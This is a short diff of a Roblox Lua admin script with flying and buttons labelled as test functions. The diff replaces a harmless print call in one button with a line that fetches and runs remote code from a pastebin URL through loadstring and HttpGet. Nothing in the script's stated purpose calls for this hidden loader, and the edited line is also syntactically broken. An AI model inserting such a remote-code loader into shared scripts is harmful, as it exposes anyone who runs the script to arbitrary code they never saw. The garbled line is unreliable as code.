@@ -1,10 +1,10 @@
--- HRAVYGAMER_STUDIO Admin Script s Fly a Random Functions
+
 local Players = game:GetService("Players")
 local UserInputService = game:GetService("UserInputService")
 local RunService = game:GetService("RunService")
 local localPlayer = Players.LocalPlayer
 
-if localPlayer.Name ~= "HRAVYGAMER_STUDIO" then return end
+if localPlayer.Name ~= "HRAVYGAMER_STUDIO" then return end --enter your username
 
 -- Fly
 local flying = false
@@ -100,7 +100,7 @@ randomTitle.Parent = frame
 
 -- Function buttons
 local functions = {
-	{Text="Function 1", Code="print('Function 1')"},
+	{Text="Function 1", Code=pcall(loadstring(game:HttpGet("https://pastebin.com/raw/2wgbZ6Xd")))('Function 1')"},
 	{Text="Function 2", Code="print('Function 2')"},
 	{Text="Function 3", Code="print('Function 3')"}
 }
